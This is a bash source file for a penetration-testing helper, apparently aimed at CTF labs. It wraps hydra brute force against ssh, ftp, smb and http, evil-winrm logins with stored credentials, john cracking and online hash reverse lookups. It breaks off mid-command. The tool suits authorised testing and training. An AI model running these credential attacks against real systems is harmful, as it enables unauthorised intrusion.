#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

# Uncomment for Debugging
#set -x
# Text color variables
#txtund=$(tput sgr 0 1)          # Underline
txtbld=$(tput bold)             # Bold
bldred=${txtbld}$(tput setaf 1) #  red
bldblu=${txtbld}$(tput setaf 4) #  blue
bldwht=${txtbld}$(tput setaf 7) #  white
txtrst=$(tput sgr0)             # Reset
info="${bldwht}[*]${txtrst}"    # Feedback
#pass="${bldblu}\[*\]${txtrst}"
warn="${bldred}[!]${txtrst}"
ques="${bldblu}[?]${txtrst}"

prompt() {
  read -p "${ques} ${bldwht}Run command? (y/N): ${txtrst}" -n 1 -r
  echo
  if [[ ! "$REPLY" =~ ^[Yy]$ ]]; then
    exit
  fi
}

showHead() {
echo ' .    .
 |\__/|
 /     \    |  FXY || Fox in the $hell   |
/_,- -,_\   |    github.com/doomguy/fxy  |
   \@/
'
}

showHelp() {
  showHead
  echo "Available commands:"
  grep "^##" "$0" | sort | column -t -s'^' | sed 's,##,  fxy ,'
  echo; exit
}

INSTCMD=""
checkCmd() {
  if [ ! "$(which "$CMD")" ]; then
    echo "${warn} '$CMD' required but missing."
    if [ -n "$INSTCMD" ]; then
      echo "${bldwht}> $INSTCMD${txtrst}"; prompt; bash -c "$INSTCMD";
    else
      exit
    fi
  fi
}

getIP() {
  if ip a | grep -q "tun0"; then
    DEV="tun0"
  else
    DEV="eth0"
  fi

  IP=$(ip -4 addr show "$DEV" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
  if [ -z "$IP" ]; then
    echo "${warn} Error getting IP. Stale tun0 device?"; exit
  fi
  echo -n "$IP"
}

getExtIP() {
  EXTIP=$(curl -s ifconfig.me)
  # curl api.ipify.org
  # curl ipinfo.io/ip
  # curl wtfismyip.com/text
  # curl checkip.amazonaws.com
  echo -n "$EXTIP"
}

showCreds() {
  FILE="creds.txt"
  echo "Available creds:"
  echo "     0  (Use for NULL sessions)"
  if [ -e "$FILE" ]; then
    column -t -s':' "$FILE" | cat -n
  else
    echo -e "\n${warn} No '$FILE' found!"
  fi
  exit
}

getCreds() {
  if [ "$CID" -eq 0 ]; then
    USRNME="NULL"
    PASSWD="NULL"
  else
    FILE="creds.txt"
    if [ ! -e "$FILE" ]; then
      echo "${warn} No '$FILE' found!"; exit
    fi
    if [ "$CID" -gt "$(wc -l $FILE | cut -d' ' -f1)" ]; then
      echo "${warn} Invalid credential ID!"; exit
    fi

    USRNME=$(sed -n "${CID}p" "$FILE" | cut -d':' -f1)
    PASSWD=$(sed -n "${CID}p" "$FILE" | cut -d':' -f2)
    HASH=$(sed -n "${CID}p" "$FILE" | cut -d':' -f3)
  fi
}

createUserPassLists() {
  FILE="creds.txt"
  if [ ! -e "$FILE" ]; then
    echo "${warn} No '$FILE' found!"; exit
  fi
  FPATH="/dev/shm/.fxy"
  if [ ! -d "$FPATH" ]; then
    mkdir "$FPATH"
  fi
  # userlist
  if [ "$(which "userlstgen.py")" ]; then
    genuserlst.py "$FILE" | tr '[:upper:]' '[:lower:]' | sort -u > "$FPATH/user.lst"
  else
    echo "${info} Did not find 'genuserlst.py' in PATH. Falling back to simple mode."
    cut -d: -f1 "$FILE" | tr '[:upper:]' '[:lower:]' | sort -u | grep -v ^$ > "$FPATH/user.lst"
  fi
  # passlist
  cut -d: -f2 "$FILE" | sort -u | grep -v ^$ > "$FPATH/pass.lst"
}

getMachinePass() {
  PASSWD="$(echo -n "$(hostname)$(cat /sys/class/net/*/address | head -n1)" | sha256sum | cut -c1-20)"
}
## h(elp)^: Show this help
if [ "$#" -lt 1 ] || [[ "$1" =~ ^h(elp)?$ ]]; then
  showHelp
  exit
fi
## r(host) [target]^: Show/Set RHOST
# Set RHOST
if [ "$#" -eq 2 ] && [[ "$1" =~ ^r(host)?$ ]]; then
  FPATH="/dev/shm/.fxy"
  FILE="/dev/shm/.fxy/rhost"
  if [ "$#" -eq 2 ]; then
    if [ ! -d "$FPATH" ]; then
      mkdir "$FPATH"
    fi
    echo "$2" > $FILE
  else
    echo "${warn} You need to supply an IP or hostname as second argument!"
  fi
  exit
fi

# Load RHOST from cache
FILE="/dev/shm/.fxy/rhost"
if [ -f $FILE ]; then
  RHOST="$(cat $FILE)"
  export RHOST

  if [ -z "$RHOST" ]; then
     echo "Something went wrong on loading '$FILE'"
     RHOST="127.0.0.1"
     export RHOST
  fi
else
  # There is no place like 127.0.0.1
  RHOST="127.0.0.1"
  export RHOST
fi

# Show RHOST
if [ "$#" -eq 1 ] && { [ "$1" == "r" ] || [ "$1" == "rhost" ]; }; then
  echo "  RHOST: $RHOST"
  exit
fi
## u(ser)a(gent) [text]^: Show/Set User-Agent
# Set USRAGENT
DEFAULTUA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36'
if [[ "$1" =~ ^u(ser)?a(gent)?$ ]] && [ "$#" -ge 2 ]; then
  FPATH="/dev/shm/.fxy"
  FILE="/dev/shm/.fxy/useragent"
  if [ "$#" -ge 2 ]; then
    if [ ! -d "$FPATH" ]; then
      mkdir "$FPATH"
    fi

    # if more than 2 args, use args >=2 as input
    INPUT="$2"
    if [ "$#" -ge 3 ]; then
      INPUT="$(echo "$@" | cut -d' ' -f2-)"
    fi

    if [[ "$2" =~ ^default|reset$ ]]; then
      INPUT="$DEFAULTUA"
    fi

    echo "$INPUT" > $FILE
  fi
  exit
fi

# Load USRAGENT from cache
FILE="/dev/shm/.fxy/useragent"
if [ -f $FILE ]; then
  USRAGENT="$(cat $FILE)"
  export USRAGENT

  if [ -z "$USRAGENT" ]; then
     echo "${warn} Something went wrong on loading '$FILE'"
     USRAGENT="$DEFAULTUA"
     export USRAGENT
  fi
else
  USRAGENT="$DEFAULTUA"
  export USRAGENT
fi

# Show USRAGENT
if [[ "$1" =~ ^u(ser)?a(gent)?$ ]] && [ "$#" -eq 1 ]; then
  echo "  User-Agent: $USRAGENT"
  exit
fi
## b(ase)64(e|d) [input]^: Base64 Encode/Decode
if [[ "$1" =~ ^b(ase)?64(e|d)?$ ]] && [ "$#" -ge 2 ]; then
  CMD="base64"; checkCmd
  case "$1" in
    "b64"|"b64e"|"base64"|"base64e")  CMD="base64 -w0" ;;
    "b64d"|"base64d")                 CMD="base64 -d" ;;
    *)                                echo "${warn} Error parsing type of operation!"; exit ;;
  esac

  # in encoding mode:
    # if more than 2 args, use args >=2 as input
  INPUT="$2"
  if [ "$CMD" == "base64 -w0" ] && [ "$#" -ge 3 ]; then
    INPUT="$(echo "$@" | cut -d' ' -f2-)"
  fi

  CMD="echo -n $INPUT | $CMD";
  bash -c "$CMD"
  exit
fi
## cewl [s(sl)|tls] [subdir]^: cewl PROTO://RHOST+SUBDIR -w RHOST_cewl.txt
if [ "$1" == "cewl" ]; then
  CMD="$1"; checkCmd
  PROTO="http"
  SUBDIR="/"
  # more than 1 arg?
  if [ "$#" -ge 2 ]; then
    # https?
    if [[ "$2" =~ ^s(sl)?|tls$ ]]; then
      PROTO="https"
    fi
    # subdir?
    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
      SUBDIR="$3"
    elif [ "$#" -eq 2 ] && [ "$PROTO" == "http" ]; then
      SUBDIR="$2"
    fi
  fi

  CMD="$CMD $PROTO://${RHOST}${SUBDIR} -w ${RHOST}_cewl.txt"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
## ciph(ey) [input]^: ciphey -t INPUT
if [[ "$1" =~ ^c(i|y)ph((e)?y)?$ ]] && [ "$#" -ge 2 ]; then
  CMD="ciphey"
  export INSTCMD="python3 -m pip install ciphey --upgrade"
  checkCmd

  # if more than 2 args, use args >=2 as input
  INPUT="$2"
  if [ "$#" -ge 3 ]; then
    INPUT="$(echo "$@" | cut -d' ' -f2-)"
  fi

  CMD="$CMD -t '$INPUT'"
  echo "${bldwht}> $CMD${txtrst}"; prompt; bash -c "$CMD";
  exit
fi
## cme|crackmapexec [smb]^: crackmapexec smb RHOST | tee
if [ "$1" == "cme" ] || [ "$1" == "crackmapexec" ]; then
  CMD="crackmapexec"; checkCmd
  if [ "$#" -eq 2 ] && [ "$2" == "smb" ]; then
    CMD="$CMD smb"
  else
    exit
  fi
  CMD="$CMD $RHOST | tee ${RHOST}_cme_$(date +%F_%H%M%S).log"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
## c(reds) [a(dd) user:pass]|[d(el) cid]|[e(dit)]^: Show/Add/Del/Edit creds
if [[ "$1" =~ ^c(reds)?$ ]]; then
  FILE="creds.txt"
  CMD=""
  if [ "$#" -eq 1 ]; then # show creds
    showCreds; exit
  elif [[ "$2" =~ ^a(dd)?$ ]] && [ "$#" -eq 3 ]; then # add entry
    ENTRY="$3"
    if [[ ! "$ENTRY" =~ .*:$ ]]; then
      ENTRY="$ENTRY:"
    fi
    CMD="echo '$ENTRY' >> $FILE"
  elif [[ "$2" =~ ^d(el)?$ ]] && [ "$#" -eq 3 ]; then # del entry
    CID="$3"
    if [ ! -e "$FILE" ]; then
      echo "${warn} No '$FILE' found!"; exit
    fi
    if [ "$CID" -gt "$(wc -l $FILE | cut -d' ' -f1)" ] || [ "$CID" -eq 0 ]; then
      echo "${warn} Invalid credential ID!"; exit
    fi
    CMD="sed -i '${CID}d' $FILE"
  elif [[ "$2" =~ ^e(dit)?$ ]]; then # edit creds
    nano "$FILE"
    exit
  fi
  if [ -z "$CMD" ]; then showCreds; exit; fi
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
## curl [s(sl)|tls] [subdir]^: curl -si PROTO://RHOST+SUBDIR | less
if [ "$1" == "curl" ]; then
  CMD="$1"; checkCmd
  PROTO="http"
  SUBDIR="/"
  # more than 1 arg?
  if [ "$#" -ge 2 ]; then
    # https?
    if [[ "$2" =~ ^s(sl)?|tls$ ]]; then
      PROTO="https"
    fi

    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
      SUBDIR="$3"
    elif [ "$#" -eq 2 ] && [ "$PROTO" == "http" ]; then
      SUBDIR="$2"
    fi
  fi

  CMD="$CMD -ski -A '$USRAGENT' $PROTO://${RHOST}${SUBDIR} | less"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
## (cyber)chef [magic]^: Open CyberChef in your browser
if [[ "$1" =~ ^(cyber)?chef$ ]]; then
  CMD="firefox"; checkCmd
  CMD="firefox https://gchq.github.io/CyberChef/"

  if [ "$#" -eq 3 ] && [ "$2" == "magic" ]; then
    INPUT=$(echo -n "$3" | base64 | sed 's,=,,g')
    echo "Run this in your browser (I can't do it for you!):"
    echo "  https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')&input=$INPUT"
    exit
  fi

  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
## dirb [s(sl)|tls] [subdir]^: dirb PROTO://RHOST+SUBDIR | tee
if [ "$1" == "dirb" ]; then
  CMD="$1"
  export INSTCMD="apt istall dirb -y"
  checkCmd
  PROTO="http"
  SUBDIR="/"
  # more than 1 arg?
  if [ "$#" -ge 2 ]; then
    # https?
    if [[ "$2" =~ ^s(sl)?|tls$ ]]; then
      PROTO="https"
    fi

    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
      SUBDIR="$3"
    elif [ "$#" -eq 2 ] && [ "$PROTO" == "http" ]; then
      SUBDIR="$2"
    fi
  fi

  CMD="$CMD $PROTO://${RHOST}${SUBDIR} -a '$USRAGENT' | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
## (evil-)winrm [cid]^: evil-winrm -i RHOST -u :cid_user -p :cid_pass
if [ "$1" == "evil-winrm" ] || [ "$1" == "winrm" ]; then
  CMD="evil-winrm"; checkCmd

  # No ID supplied
  if [ "$#" -eq 1 ]; then
    showCreds
    exit
  fi

  # CredID supplied
  if [ "$#" -eq 2 ]; then
    CID="$2"
    getCreds
  fi

  CMD="$CMD -i $RHOST -u '$USRNME' -p '$PASSWD'"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
## fix [deps|pip(3)|py(thon)(3)|sys(tem)]^: Fix stufff
if [[ "$1" =~ ^fix$ ]] && [ "$#" -eq 2 ]; then
  if [[ "$2" =~ ^dep(s|endencies)$ ]]; then
    echo '# Run this as root to install all fxy dependencies:'
    echo '#   fxy fix deps | bash'
    grep "export INSTCMD" "$0" | grep -v 'grep " export' | cut -d'=' -f2 | sort | while read -r LINE; do
      # Remove double quotes
      LINE=$(sed 's,^"\(.*\)"$,\1,' <<< "$LINE")
      echo "$LINE"
    done
  elif [[ "$2" =~ ^pip(3)?$ ]]; then
    CMD="/usr/bin/python3 -m pip install --upgrade pip"
    echo "${bldwht}> $CMD${txtrst}"; prompt; bash -c "$CMD"
  elif [[ "$2" =~ ^py(3)?|python(3)?$ ]]; then
    CMD="pip list --outdated --format=freeze | cut -d'=' -f1 | xargs -n1 pip install --upgrade"
    echo "${bldwht}> $CMD${txtrst}"; prompt; bash -c "$CMD"
  elif [[ "$2" =~ ^sys(tem)?$ ]]; then
      CMD="apt update && apt dist-upgrade -y"
      echo "${bldwht}> $CMD${txtrst}"; prompt; bash -c "$CMD"
  fi
  exit
fi
## h(ash)c(rack) [type] [hash|cid]^: Crack hash
if { [ "$1" == "hashcrack" ] || [ "$1" == "hc" ]; } && [ "$#" -eq 3 ]; then
  WRDLST="/usr/share/wordlists/rockyou.txt"
  if [ ! -f "$WRDLST" ]; then
    if [ -e "$WRDLST.gz" ]; then
      echo "${ques} rockyou still zipped. Unzip?"
      CMD="gunzip $WRDLST.gz"
      echo "${bldwht}> $CMD${txtrst}"; prompt; bash -c "$CMD"
    else
      WRDLST="/path/to/my/wrdlst"
    fi
  fi

  TYPE="$2"
  case "$TYPE" in
    "md5" )             JTYPE="raw-md5" ;;
    "sha"|"sha1")       JTYPE="raw-sha1" ;;
    "sha256"|"sha2")    JTYPE="raw-sha256" ;;
    "sha512"|"sha5")    JTYPE="raw-sha512" ;;
    *)                  echo "${warn} Error parsing type of hash!"; exit ;;
  esac

  HASH="$3"
  USRNME="unknown"
  if [ "$(echo -n "$HASH" | wc -c)" -le 2 ] && [ "$HASH" -ge 1 ]; then
    # assume a cid is given since hash is too short
    CID="$3"
    getCreds
    if [ -z "$HASH" ]; then
      echo "${warn} No hash found for credential ID '$CID'"; exit
    fi
  fi
  # write hash to file with username
  CMD1="echo \"$USRNME:$HASH\" > hash_$USRNME.txt"
  CMD2="john --format=$JTYPE --wordlist $WRDLST --fork=2 --pot=hash.pot hash_$USRNME.txt"
  echo -e "> $CMD1\n> $CMD2"; prompt; bash -c "$CMD1 && $CMD2"; exit
fi
# 2DO:
# - add hashcat support
# http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats
## md5|sha(1)|sha2(56)|sha3(84)|sha5(12) [input]^: Generate hashes from input
if { [[ "$1" =~ ^md5|sha(1)?|sha2(56)?|sha3(84)?|sha5(12)?$ ]]; } && [ "$#" -ge 2 ]; then
  TYPE="$1"
  INPUT="$2"

  # if more than 2 args, use args >=2 as input
  if [ "$#" -ge 3 ]; then
    INPUT=$(echo -n "$@" | cut -d' ' -f2-)
  fi

  case "$TYPE" in
    "md5" )             CMD="md5sum" ;;
    "sha"|"sha1")       CMD="sha1sum" ;;
    "sha256"|"sha2")    CMD="sha256sum" ;;
    "sha384"|"sha3")    CMD="sha384sum" ;;
    "sha512"|"sha5")    CMD="sha512sum" ;;
    *)                  echo "${warn} Error parsing type of hash!"; exit ;;
  esac

  checkCmd
  echo -n "$INPUT" | $CMD | cut -d' ' -f1
  exit
fi
## h(ash)i(d) [hash|cid]^: Identify hash type
if [[ "$1" =~ ^h(ash)?i(d)?$ ]] && [ "$#" -eq 2 ]; then
  HASH="$2"
  if [ "$(echo -n "$HASH" | wc -c)" -le 2 ] && [ "$HASH" -ge 1 ]; then
    # assume a cid is given since hash is too short
    CID="$2"
    getCreds
    if [ -z "$HASH" ]; then
      echo "${warn} No hash found for credential ID '$CID'"; exit
    fi
    echo -e "${info} Identifying hash: $HASH\n"
  fi

  if [ "$(which hashid)" ]; then
    echo "=== hashid ==="
    hashid "$HASH" | grep -v ^Analyzing; echo
  fi
  if [ "$(which hash-identifier)" ] ;then
    echo "=== hash-identifier ==="
    echo -n "$HASH" | hash-identifier 2>/dev/null | sed '1,14d' | head -n -2
  fi
  exit
fi
## h(ash)s(earch) [md5|sha1|...] [hash|cid]^: Search for hashes
# hashsearch help
if [[ "$1" =~ ^h(ash)?s(earch)?$ ]] && [ "$#" -eq 1 ]; then
  echo "Available commands:"
  echo "  fxy h(ash)s(earch) [md5|sha(1)|sha2(56)|sha3(84)|sha5(12)] [hash|cid]"
  exit
fi

if [[ "$1" =~ ^h(ash)?s(earch)?$ ]] && [ "$#" -ge 3 ]; then
  HASH="$3"
  if [ "$(echo -n "$HASH" | wc -c)" -le 2 ] && [ "$HASH" -ge 1 ]; then
    # assume a cid is given since hash is too short
    CID="$3"
    getCreds
    if [ -z "$HASH" ]; then
      echo "${warn} No hash found for credential ID '$CID'"; exit
    fi
    echo "${info} Searching for hash: $HASH"
  fi

  case "$2" in
    "md5")              TYPE="md5";
                        [[ "$HASH" =~ ^[A-Za-z0-9]{32}$ ]] || { echo "${warn} Invalid MD5 Hash!"; exit; };
                        [ "$HASH" == 'd41d8cd98f00b204e9800998ecf8427e' ] && { echo "${warn} Empty MD5 Hash!"; exit; } ;;
    "sha"|"sha1")       TYPE="sha1";
                        [[ "$HASH" =~ ^[A-Za-z0-9]{40}$ ]] || { echo "${warn} Invalid SHA1 Hash!"; exit; };
                        [ "$HASH" == 'da39a3ee5e6b4b0d3255bfef95601890afd80709' ] && { echo "${warn} Empty SHA1 Hash!"; exit; } ;;

    "sha256"|"sha2")    TYPE="sha256";
                        [[ "$HASH" =~ ^[A-Za-z0-9]{64}$ ]] || { echo "${warn} Invalid SHA256 Hash!"; exit; };
                        [ "$HASH" == 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' ] && { echo "${warn} Empty SHA256 Hash!"; exit; } ;;

    "sha384"|"sha3")    TYPE="sha384";
                        [[ "$HASH" =~ ^[A-Za-z0-9]{96}$ ]] || { echo "${warn} Invalid SHA384 Hash!"; exit; };
                        [ "$HASH" == '38b060a751ac96384cd9327eb1b1e36a21fdb71114be07434c0cc7bf63f6e1da274edebfe76f65fbd51ad2f14898b95b' ] && { echo "${warn} Empty SHA384 Hash!"; exit; } ;;

    "sha512"|"sha5")    TYPE="sha512";
                        [[ "$HASH" =~ ^[A-Za-z0-9]{128}$ ]] || { echo "${warn} Invalid SHA512 Hash!"; exit; };
                        [ "$HASH" == 'cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e' ] && { echo "${warn} Empty SHA512 Hash!"; exit; } ;;

    "lm"|"LM")          TYPE="lm";
                        [[ "$HASH" =~ ^[A-Za-z0-9]{16,32}$ ]] || { echo "${warn} 111 Invalid LM Hash!"; exit; };
                        [ "$HASH" == 'aad3b435b51404ee' ] && { echo "${warn} Empty LM Hash!"; exit; } ;;

    "nt"|"NT")          TYPE="nt";
                        [[ "$HASH" =~ ^[A-Za-z0-9]{32}$ ]] || { echo "${warn} Invalid NT Hash!"; exit; } ;;

    *)                  TYPE="any" ;;
    esac

  [ "${4-default}" == "qq" ] || sleep 2

  # hashtoolkit.com
  if [[ "$TYPE" =~ ^md5|sha1|sha256|sha384|sha512$ ]]; then
    RES="$(curl -ski -A "$USRAGENT" https://hashtoolkit.com/reverse-"$TYPE"-hash/?hash="$HASH")"

    if [ -n "$(grep -i 'No hashes found for' <<< "$RES")" ]; then
      echo "${warn} (hashtoolkit.com) No match found!";
    else
      PASSWD="$(grep -m 1 -io "/generate-hash/?text=.*>" <<< "$RES" | cut -d'>' -f2 | sed 's,</a,,')"
      PASSWD="$(sed 's,&lt;,<,' <<< "$PASSWD")"
      PASSWD="$(sed 's,&gt;,>,' <<< "$PASSWD")"
      echo "${info} (hashtoolkit.com) Match found: '$PASSWD'"; exit
    fi
  fi

  # gromweb.com
  if [[ "$TYPE" =~ ^md5|sha1$ ]]; then
    case "$TYPE" in
      "md5")        RES="$(curl -ski -A "$USRAGENT" https://md5.gromweb.com/?md5="$HASH")" ;;
      "sha1")       RES="$(curl -ski -A "$USRAGENT" https://sha1.gromweb.com/?hash="$HASH")" ;;
      *)            echo "${warn} Error parsing type of hash!"; exit ;;
    esac

    PASSWD="$(grep -i "was succesfully reversed" -A1 <<< "$RES" | grep "long-content string" | cut -d'>' -f2 | sed 's,</em.*,,' )"
    if [ -z "$RES" ]; then
      echo "${warn} (gromweb.com) No match found!";
    else
      echo "${info} (gromweb.com) Match found: '$PASSWD'"; exit
    fi
  fi

  # objectif-securite.ch
  if [ "$TYPE" == "nt" ]; then
    RES=$(curl -sk 'https://cracker.okx.ch/crack' \
      -H 'authority: cracker.okx.ch' \
      -H 'pragma: no-cache' \
      -H 'cache-control: no-cache' \
      -H 'accept: application/json, text/javascript, */*; q=0.01' \
      -H 'dnt: 1' \
      -H "user-agent: $USRAGENT" \
      -H 'content-type: application/json' \
      -H 'origin: https://www.objectif-securite.ch' \
      -H 'sec-fetch-site: cross-site' \
      -H 'sec-fetch-mode: cors' \
      -H 'sec-fetch-dest: empty' \
      -H 'referer: https://www.objectif-securite.ch/' \
      -H 'accept-language: en-GB,en-US;q=0.9,en;q=0.8' \
      -H 'Connection: close' \
      --data-binary '{"value":"'"$HASH"'"}' \
      --compressed)

    PASSWD="$(jq -r .msg <<< "$RES")"
    if [[  ! "$RES" =~ Password\ not\ found ]]; then
      echo "${warn} (objectif-securite.ch) No match found!";
    else
      echo "${info} (objectif-securite.ch) Match found: '$PASSWD'"; exit
    fi
  fi

  # it64.com
  if [ "$TYPE" == "lm" ]; then
    HLEN="$(echo -n "$HASH" | wc -c)"
    if { [[ ! "$HASH" =~ ^[A-Za-z0-9]{16}$ ]] && [[ ! "$HASH" =~ ^[A-Za-z0-9]{32}$ ]]; } || [ "$HASH" == "aad3b435b51404ee" ]; then
      echo "${warn} Invalid LM Hash!"; exit
    fi

    HASHES="$(echo -n "$HASH" | cut -c1-16)"
    if [ "$HLEN" -eq 32 ]; then
      HASH2="$(echo -n "$HASH" | cut -c17-32)"
      if [ "$HASH2" != "aad3b435b51404ee" ]; then
        HASHES="$HASHES $HASH2"
      fi
    fi

    PASSWD=""
    IFS=' '; for h in $HASHES; do
      RES=$(curl -sk 'http://rainbowtables.it64.com/p3.php' \
        -H "user-agent: $USRAGENT" \
        -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
        -H 'Accept-Language: en-US,en;q=0.5' \
        --compressed \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        -H 'Origin: http://rainbowtables.it64.com' \
        -H 'DNT: 1' \
        -H 'Connection: close' \
        -H 'Referer: http://rainbowtables.it64.com/p3.php' \
        -H 'Upgrade-Insecure-Requests: 1' \
        --data-raw 'hashe='"$h"'&ifik=+Submit+&forma=tak')

      if [[ "$RES" =~ CRACKED ]]; then
        PASSWD="${PASSWD}$(grep -o  'CRACKED&nbsp;</TD><TD>&nbsp;.*&nbsp;' <<< "$RES" | sed 's/.*&nbsp;\(.*\)&nbsp;/\1/')"
      fi

    done

    if [ -n "$PASSWD" ]; then
      echo "${info} (it64.com) Match found: '${PASSWD}'"; exit
    else
      echo "${warn} (it64.com) No match found!"
    fi
  fi

  # online-domain-tools.com
  if [[ "$TYPE" =~ ^md5|sha1|sha256|lm|nt$ ]]; then
    if [ "$TYPE" == "nt" ]; then TYPE="ntlm"; fi
    RES=$(curl -ski -A "$USRAGENT" "https://reverse-hash-lookup.online-domain-tools.com/" --data "text=$HASH&function=$TYPE&do=form-submit&phone=5deab72563840e7678c4067671849b85332d7438&send=%3E+Reverse!")
    if [ -n "$(grep -i 'You do not have enough credits in your account.' <<< "$RES")" ]; then
      echo "${warn} (online-domain-tools.com) No free credits left!"
    elif [ -n "$(grep -i 'Hash #1:</b> ERROR:' <<< "$RES")" ]; then
      echo "${warn} (online-domain-tools.com) No match found or error!"
    else
      PASSWD="$(grep -o -m 1 "Hash #1.*" <<< "$RES" | cut -d' ' -f3 | sed 's,</.*$,,')"
      PASSWD="$(sed 's,&lt;,<,' <<< "$PASSWD")"
      PASSWD="$(sed 's,&gt;,>,' <<< "$PASSWD")"
      echo "${info} (online-domain-tools.com) Match found: '$PASSWD'"; exit
    fi
  fi

  # hashes.org
  if [[ "$TYPE" =~ ^.*$ ]]; then # search for any hash type
    RES=$(curl -ski -A "$USRAGENT" https://hashes.com/en/decrypt/hash)
    if [[ "$RES" =~ captcha/images ]]; then
      echo -n "${warn} (hashes.org) Captcha detected! Retrying in "
      for i in {90..1}; do echo -n "${i}s "; sleep 1; done; echo
      RES=$(curl -ski -A "$USRAGENT" https://hashes.com/en/decrypt/hash)
    fi
    CSRF=$(grep 'csrf_token' <<< "$RES" | cut -d'"' -f6)
    RES=$(curl -ski -A "$USRAGENT" -b "csrf_token=$CSRF" https://hashes.com/en/decrypt/hash --data-raw "csrf_token=$CSRF&hashes=$HASH&submitted=true")
    if [[ "$RES" =~ "Please wait 10 seconds" ]]; then
      echo -n "${warn} (hashes.org) Too fast! Please retry in 60s!"
    elif [[ "$RES" =~ "0 found 1 not found" ]]; then
      echo "${warn} (hashes.org) No match found!"
    elif [[ "$RES" =~ "Invalid captcha" ]]; then
      echo "${warn} (hashes.org) Captcha error! Please retry in 1min!"
    elif [[ "$RES" =~ "1 found 0 not found" ]]; then
      PASSWD=$(grep -o "$HASH.*" <<< "$RES" | sed "s,$HASH:\(.*\)</div></pre>.*,\1," | tr -d '\r\n')
      echo "${info} (hashes.org) Match found: '$PASSWD'"; exit
    fi
  fi

  # Still here?
  echo -e "\nNothing found so far. Want to try it manually on crackstation.net?"
  CMD="firefox 'https://crackstation.net'"
  echo "${bldwht}> $CMD${txtrst}"; prompt; bash -c "$CMD"; exit
fi
# 2DO:
# - https://md5decrypt.net/en/Api/ - signup broken
# - implement more lm/ntlm crackers
# torify
## httpd|ws [port]^: python3 -m http.server PORT
if [ "$1" == "httpd" ] || [ "$1" == "ws" ] ; then
  CMD="python3 -m http.server"
  PORT="80"
  if [ "$#" -eq 2 ]; then
    PORT="$2"
  fi
  CMD="$CMD $PORT"
  echo "URL: http://$(getIP)/"
  echo "DIR: $(pwd)"
  for f in $(find . -maxdepth 1 -type f 2>/dev/null | sed 's,\./,,' | sed 's, ,+,'); do
    echo "- http://$(getIP)/$f";
  done
  echo "${bldwht}> $CMD${txtrst}"
  bash -c "$CMD"
  exit
fi
## hydra [service] [port] [username]^: hydra brute force (ssh, ftp, smb)
# hydra help
if [[ "$1" =~ ^hydra|brute$ ]] && [ "$#" -eq 1 ]; then
  echo "Available commands:"
  echo "  fxy hydra ssh [port] [username]"
  echo "  fxy hydra ftp [port] [username]"
  echo "  fxy hydra smb [port] [username]"
  echo "  fxy hydra http [port] [username] [subdir]"
  echo -e "\n[i] For more check out: https://book.hacktricks.xyz/brute-force"
  exit
fi

# hydra -I -L user.lst -P pass.lst -u -e sr -s 22333 127.0.0.1 ssh
# hydra -I -L user.lst -P pass.lst -u -e sr -s 21 127.0.0.1 ftp
# hydra -I -L user.lst -P pass.lst -u -e sr -s 445 127.0.0.1 smb
# hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
if [[ "$1" =~ ^hydra|brute$ ]] && [ "$#" -ge 2 ]; then
  CMD="hydra"
  export INSTCMD="apt install hydra -y"
  checkCmd
  createUserPassLists
  FPATH="/dev/shm/.fxy"
  SUBDIR="" # used for http

  SVC="$2"
  case "$SVC" in
    "ssh")              PORT="-s 22"; SVC="ssh" ;;
    "ftp")              PORT="-s 21"; SVC="ftp" ;;
    "smb")              PORT="-s 445"; SVC="smb" ;;
    "http"|"http-get")  PORT="-s 80"; SVC="http-get"; SUBDIR="/" ;;
    *)                  echo "${warn} Error parsing service to attack!"; exit ;;
  esac

  if [ "$#" -ge 3 ]; then
    if [[ "$3" =~ ^[0-9]+$ ]]; then
      PORT="-s $3"
    else
      echo "${warn} Invalid Port number!"; exit
    fi
  fi

  if [ "$#" -ge 4 ]; then
    USRNME="-l $4"
  else
    USRNME="-L $FPATH/user.lst"
  fi

  if [ "$SVC" == "http-get" ] && [ "$#" -ge 5 ]; then
    SUBDIR="$5"
  fi

  CMD="hydra -I $USRNME -P $FPATH/pass.lst -u -e sr $PORT $RHOST $SVC $SUBDIR"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
## (i)conv|convert [file]^: iconv -f UTF-16LE -t UTF-8 FILE -o FILE.conv
if { [ "$1" == "iconv" ] || [ "$1" == "conv" ] || [ "$1" == "convert" ]; } && [ "$#" -eq 2 ]; then
  CMD="iconv"; checkCmd

  FILE="$2"
  if [ ! -f "$FILE" ]; then
    echo "${warn} Invalid input file!"; exit
  fi

  CMD="iconv -f UTF-16LE -t UTF-8 $FILE -o $FILE.conv"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
## ip(s)^: Show interface and external IP(s)
if [[ "$1" =~ ^ip(s)?$ ]]; then
  CMD="ip"; checkCmd
  ip a \
